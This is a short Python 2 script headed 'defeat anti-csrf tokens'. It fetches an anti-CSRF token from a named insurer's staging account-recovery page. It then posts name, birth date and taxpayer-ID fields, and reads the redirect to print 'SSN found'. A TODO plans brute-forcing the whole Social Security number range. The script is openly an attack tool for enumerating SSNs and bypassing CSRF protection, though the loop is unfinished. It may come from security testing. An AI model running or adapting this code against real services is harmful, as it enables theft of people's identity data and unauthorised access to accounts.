#!/usr/bin/env python

#####################
# defeat anti-csrf tokens
#####################

try:
	import requests
	import lxml.html as lh
	from io import StringIO
except ImportError, e:
	print "Exception: {}".format(str(e))
	exit(1)

# establish vars
url = 'https://servicestage.northwesternmutual.com/CXID/forgotUserNameIdentification.do'
token = str()
proxies = { 'https': 'http://172.21.22.204:8080' }	#for testing
# TODO: this causes a python 'MemoryError' ssn = range(111111111, 888888888) 

def get_token():
    global token
    global s
    # establish session
    s = requests.Session()
    # make initial request to get token
    gr = s.get(url, proxies=proxies, verify=False)
    # access response and retrieve anti-csurf token
    tree = lh.fromstring(gr.content)
    token = tree.xpath('//input[@name="org.apache.struts.taglib.html.TOKEN"]/@value')[0]
    return token, s

# POST SSN request with token
## TODO: add ssn range as argument to post_ssn function
def post_ssn():
    global location
    global pr
    pr = s.post(url, data=data, proxies=proxies, verify=False, allow_redirects=False) 
    try:
        location = pr.headers['Location']
        if location != 'https://servicestage.northwesternmutual.com/CXID/forgotUserNameFailure.do':
            print 'SSN found: ' ## TODO add in with argument ## %s' %(ssn)
        else:
            return location
    except:
        location = "No 'Location' Header was returned by the server"
        return pr

if not token:
    get_token()
data = {'org.apache.struts.taglib.html.TOKEN':token, 'firstName':'matt', 'lastName':'lange', 'clientDOB':'1%2F1%2F2000','taxPayerId':'123456789', 'emailAddress':'matt%40matt.com'}
post_ssn() 
print location
